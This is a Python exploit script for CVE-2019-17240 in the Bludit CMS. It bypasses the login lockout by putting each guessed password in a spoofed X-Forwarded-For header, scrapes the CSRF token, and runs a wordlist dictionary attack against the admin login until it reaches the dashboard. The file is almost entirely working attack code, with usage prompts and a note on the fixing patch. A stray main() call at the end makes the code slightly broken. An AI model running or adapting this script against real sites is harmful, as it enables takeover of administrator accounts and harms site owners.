#!/usr/bin/env python3
# Bludit Brute Force Mitigation Bypass
#
# CVE REFERENCE: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-17240
# EXPLOIT TEMPLATE: https://rastating.github.io/bludit-brute-force-mitigation-bypass/
# Update to a version later than 3.9.2 or apply the patch found at https://github.com/bludit/bludit/pull/1090
import re
import requests
import socket
import sys



class PasswordAttack:
    def __init__(self, host, uri, username, wordlist_file):
        """Define properties of PasswordAttack class"""
        self.host = host
        self.uri = uri
        self.username = username
        self.wordlist_file = wordlist_file



def main(*args):
    """Main function to carry out dictionary attack"""
    message = """
CVE-2019-17240: 
Automating the generation of unique header values to carry out password dictionary attack

USAGE: python3 CVE-2019-17240.py
       python3 CVE-2019-17240.py '10.10.10.10' '/admin/login' 'admin' '/usr/share/wordlists/rockyou.txt'
"""
    print(message)
    
    attack = PasswordAttack(host, login_url, username, wordlist)
    
    for password in wordlist.split():
        session = requests.Session()
        login_page = session.get(login_url)
        csrf_token = re.search('input.+?name="tokenCSRF".+?value="(.+?)"', login_page.text).group(1)

        print('[*] Trying: {}'.format(password))

        headers = {
            'X-Forwarded-For': password,
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36',
            'Referer': login_url
        }

        data = {
            'tokenCSRF': csrf_token,
            'username': username,
            'password': password,
            'save': ''
        }

        login_result = session.post(login_url, headers = headers, data = data, allow_redirects = False)

        if 'location' in login_result.headers:
            if '/admin/dashboard' in login_result.headers['location']:
                print('\nSUCCESS: Password found!\n')
                print('\nUse {u}:{p} to login.\n'.format(u = username, p = password))
                break


if __name__ == '__main__':
    if len(sys.argv) == 5:
        host = sys.argv[1]
        uri = sys.argv[2] 
        login_url = "http://" + host + uri
        username = sys.argv[3]
        wordlist_file = sys.argv[4]
        wordlist = open(wordlist_file, "r").read()
        attack = PasswordAttack(host, login_url, username, wordlist)
        main(host, login_url, username, wordlist)
    else:
        print("\n[!] 4 Arguments were not specified. You will be prompted for values : ")
        host = input("\nEnter the IP address or FQDN of the Bludit server: Example: 10.10.10.10 : ")
        uri = input("\nEnter the URI location for the login. Example: /admin/login : ")
        login_url = "http://" + host + uri
        username = input("\nEnter the username to check passwords against. Exmaple: admin : ")
        wordlist_file = input("\nEnter the path to the wordlist you wish to use. Example: /usr/share/wordlists/rockyou.txt : ")
        wordlist = open(wordlist_file, "r").read()
        attack = PasswordAttack(host, login_url, username, wordlist)
        main(host, login_url, username, wordlist)

main()
